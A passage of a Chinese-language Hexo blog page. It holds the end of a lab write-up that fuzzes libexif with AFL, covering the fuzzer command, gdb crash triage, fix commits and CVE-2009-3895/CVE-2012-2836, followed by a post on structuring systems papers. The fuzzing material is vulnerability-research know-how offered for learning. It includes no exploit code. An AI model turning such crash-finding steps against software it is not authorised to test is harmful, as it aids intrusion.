afl-clang-fast/++</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line"> +--------------------------------+</span><br><span class="line"> | gcc 5+ is available            | -&gt; use GCC_PLUGIN mode (afl-gcc-fast/afl-g++-fast)</span><br><span class="line"> +--------------------------------+    see [instrumentation/README.gcc_plugin.md](instrumentation/README.gcc_plugin.md) and</span><br><span class="line">                                       [instrumentation/README.instrument_list.md](instrumentation/README.instrument_list.md)</span><br><span class="line">    |</span><br><span class="line">    | if not, or if you do not have a gcc with plugin support</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">   use GCC mode (afl-gcc/afl-g++) (or afl-clang/afl-clang++ for clang)</span><br></pre></td></tr></table></figure>

<h4 id="5、fuzzing"><a href="#5、fuzzing" class="headerlink" title="5、fuzzing"></a>5、fuzzing</h4><p>使用以下命令运行fuzzer</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i $HOME/fuzzing_libexif/exif-samples-master/jpg/ -o $HOME/fuzzing_libexif/out/ -s 123 -- $HOME/fuzzing_libexif/install/bin/exif @@</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/78f8b744-54ce-4d0c-b39d-819491dfad7d" alt="image"></p>
<p>几分钟后可以看见有多个崩溃</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b67623b8-6a50-4130-9ecc-3605eb0c0f83" alt="image"></p>
<p>可以在这里找到崩溃的图像文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6920c7f3-ef27-450d-bc94-8a719b8cfd51" alt="image"></p>
<h5 id="6、动态调试"><a href="#6、动态调试" class="headerlink" title="6、动态调试"></a>6、动态调试</h5><p>编译出带调试信息的可执行文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9615bc59-6331-4782-9e3e-978bf3170239" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2e6a9d0d-4a1c-45d0-ad8b-1d2fd8236f38" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b71abd7e-80d5-4908-b4b9-06d0273d1b51" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/96c5f039-dc94-41e5-93c9-f2ef5d802ff2" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bb07280f-84e4-40a3-86da-81b1ae37c7ac" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2cd7f21f-dcfa-4b47-9ddc-4a87efbb794a" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8c87e2c4-8d92-4f0a-ab71-e744d772344e" alt="image"></p>
<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230728003925454.png" alt="image-20230728003925454"></p>
<p>放到gdb中，跑出clash</p>
<h6 id="clash1"><a href="#clash1" class="headerlink" title="clash1"></a>clash1</h6><p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d21d484c-3feb-4091-8cb7-a33113e8449c" alt="image"></p>
<p>报错信息**Program received signal SIGSEGV, Segmentation fault.**存在内存泄漏</p>
<p>报错位置<strong>in exif_data_load_data (data&#x3D;0x4538c0, d_orig&#x3D;<optimized out>, ds_orig&#x3D;<optimized out>) at exif-utils.c:94 94 return ((buf[1] &lt;&lt; 8) | buf[0]);</strong></p>
<p>注意这里的报错，内存地址无法访问，再看地址，猜测为堆缓冲区溢出</p>
<h6 id="clash2"><a href="#clash2" class="headerlink" title="clash2"></a>clash2</h6><p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c527947c-bf6e-409e-9fcb-4dbd094d6396" alt="image"></p>
<p>报错信息**Program received signal SIGSEGV, Segmentation fault.**存在内存泄露</p>
<p>报错位置<strong>in exif_data_load_data (data&#x3D;0x4538c0, d_orig&#x3D;<optimized out>, ds_orig&#x3D;<optimized out>) at exif-utils.c:94</strong></p>
<h6 id="clash3"><a href="#clash3" class="headerlink" title="clash3"></a>clash3</h6><p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/084afe63-c7a2-486b-9e8e-d5509d4efe19" alt="image"></p>
<p>报错信息**Program received signal SIGSEGV, Segmentation fault.**存在内存泄露</p>
<p>报错位置<strong>in exif_data_load_data (data&#x3D;0x4538c0, d_orig&#x3D;<optimized out>, ds_orig&#x3D;<optimized out>) at exif-utils.c:94</strong></p>
<h5 id="7、漏洞修复"><a href="#7、漏洞修复" class="headerlink" title="7、漏洞修复"></a>7、漏洞修复</h5><p><a target="_blank" rel="noopener" href="https://github.com/libexif/libexif/commit/8ce72b7f81e61ef69b7ad5bdfeff1516c90fa361">https://github.com/libexif/libexif/commit/8ce72b7f81e61ef69b7ad5bdfeff1516c90fa361</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/libexif/libexif/commit/00986f6fa979fe810b46e376a462c581f9746e06">https://github.com/libexif/libexif/commit/00986f6fa979fe810b46e376a462c581f9746e06</a></p>
<h4 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h4><p>通过这个实验，我了解了<strong>CVE-2009-3895</strong>漏洞和<strong>CVE-2012-2836</strong>漏洞，学习了<strong>libexif</strong>，找到一个使用libexif库的接口应用程序，创建一个出口样本的种子语料库使，用afl-clang-lto编译libexif和选择的应用程序，模糊libexif，直到有一些独特的崩溃，分类崩溃以找到每个漏洞的PoC</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/27/Exercise%202%20-%20libexif/" data-id="clklekotu0000m8vf1b0j8wpb" data-title="Exercise 2 - libexif" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Paper-The structure of paper or report in Systems" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/26/Paper-The%20structure%20of%20paper%20or%20report%20in%20Systems/" class="article-date">
  <time class="dt-published" datetime="2023-07-26T15:09:39.000Z" itemprop="datePublished">2023-07-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/07/26/Paper-The%20structure%20of%20paper%20or%20report%20in%20Systems/">《The structure of paper/report in Systems》</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="系统中纸张-x2F-报告的结构"><a href="#系统中纸张-x2F-报告的结构" class="headerlink" title="系统中纸张&#x2F;报告的结构"></a>系统中纸张&#x2F;报告的结构</h3><p><a target="_blank" rel="noopener" href="http://www.cs.ucr.edu/~michalis/TECHWRITING/structure.html">结构 (ucr.edu)</a></p>
<p>写论文时要遵循一些规则：</p>
<p>递归性1：每一部分的第一段应该是本节的摘要&#x2F;概述，可以先说“在本节中，我们将介绍…”</p>
<p>递归性2：每个段落中，第一行&#x2F;第二行应该对应于段落的摘要</p>
<p>自上而下：从高层次开始，慢慢增加细节，让读者知道我们想往哪方面扩展</p>
<h4 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h4><p>摘要主要介绍我们所做的工作，一段200-300字，用于吸引读者阅读文章</p>
<ol>
<li>本文的目标（1-2行）</li>
<li>工作的动机和重要性（1-2行）</li>
<li>我们工作的结果或贡献（1-2行）最好引用直观或易于解释的指标的数字来量化</li>
</ol>
<h4 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h4><p>提出问题，动机，重要性，主要贡献</p>
<ol>
<li>问题：高层次的定义，意义</li>
<li>以前的工作</li>
<li>我们的贡献</li>
<li>本文结构介绍</li>
</ol>
<h4 id="背景和模型"><a href="#背景和模型" class="headerlink" title="背景和模型"></a>背景和模型</h4><p>定义，场景，模型</p>
<ol>
<li>以前的工作，有助于于我们的工作进行对比，来说我们的工作是否有创新点，与以前的工作相比有什么优势</li>
<li>以前工作的弱点，或在一些方面有什么没有考虑到的东西</li>
<li>我们工作的假设和局限性（只是诚实地提出来，不要谴责我们的工作）</li>
</ol>
<h4 id="我们的想法"><a href="#我们的想法" class="headerlink" title="我们的想法"></a>我们的想法</h4><p>介绍我们的创新点</p>
<p>如果有必要，对我们所作的工作中的一些名词进行介绍，它的定义以及它是如何工作的</p>
<p>详细地介绍细节</p>
<p>对我们在这一节写的内容进行分析</p>
<h4 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h4><p>实验概述：我们了做什么，我们没做什么，为什么</p>
<p>模拟模型或测量基础设施</p>
<p>实验结果</p>
<p>使用标题（粗体） 区分实验（即尺寸对性能的影响，或者甚至更好的尺寸不会影响性能）</p>
<p>每个情节都应该出现一个明确的原因（比如说负载越大，吞吐量越差）</p>
<p>解释每个图：轴，我们看到的，趋势是什么，为什么是这样的趋势</p>
<p>统计，强化结果：置信区间、相关系数等。</p>
<p>每个数字应该是准确的：标题应该是可读的，并且可理解的。</p>
<p>评论，讨论， 解释</p>
<h4 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h4><p>如果我们还有想法，可以在论文中展示出来，比如说重要性，与其他作品的关系，可能的实际应用</p>
<h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>结论是非常重要的，我们在结论中要</p>
<ol>
<li>对所作的工作进行概述</li>
<li>主要成果和贡献</li>
<li>重要性</li>
<li>实用技巧（帮助别的研究人员使用我们做的东西，避免错误）</li>
<li>未来工作，强调工作的重要性，但是要避免给出自己的想法</li>
</ol>
<h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><p>要按照参考文献的标准，必须正确、完整、准确</p>
<h4 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h4><p>我们可以再附录写任何我们想写的东西</p>
<ol>
<li>提供额外的结果，以加强我们的论点</li>
<li>通过在这里放一个冗长的证明或讨论一个细节来保持论文的流畅性</li>
<li>解决一个问题，表明我们已经深入思考了这个问题</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/26/Paper-The%20structure%20of%20paper%20or%20report%20in%20Systems/" data-id="clrsrunnb000740vfbcnwbs4c" data-title="《The structure of paper/report in Systems》" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/learn/" rel="tag">learn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/security/" rel="tag">security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 20px;">Fuzzing</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 10px;">Web安全</a> <a href="/tags/learn/" style="font-size: 15px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 20px;">论文细读</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/01/29/Paper-Yet%20Another%20Traffic%20Classifier%20A%20Masked%20Autoencoder%20Based%20Traffic%20Transformer%20with%20Multi-Level%20Flow%20Representation/">Yet Another Traffic Classifier</a>
          </li>
        
          <li>
            <a href="/2024/01/27/Paper-SQIRL%20Grey-Box%20Detection%20of%20SQL%20Injection%20Vulnerabilities%20Using%20Reinforcement%20Learning/">SQIRL</a>
          </li>
        
          <li>
            <a href="/2024/01/26/Web-XSS1/">XSS1-原理分类及攻击手法</a>
          </li>
        
          <li>
            <a href="/2024/01/25/Paper-Deep%20Learning%20Based%20Malware%20Traffic%20Classification%20for%20Power%20Internet%20of%20Things%20Network%20Security/">Deep Learning Based Malware Traffic Classification for Power Internet of Things Network Security</a>
          </li>
        
          <li>
            <a href="/2024/01/24/PHP/">PHP</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>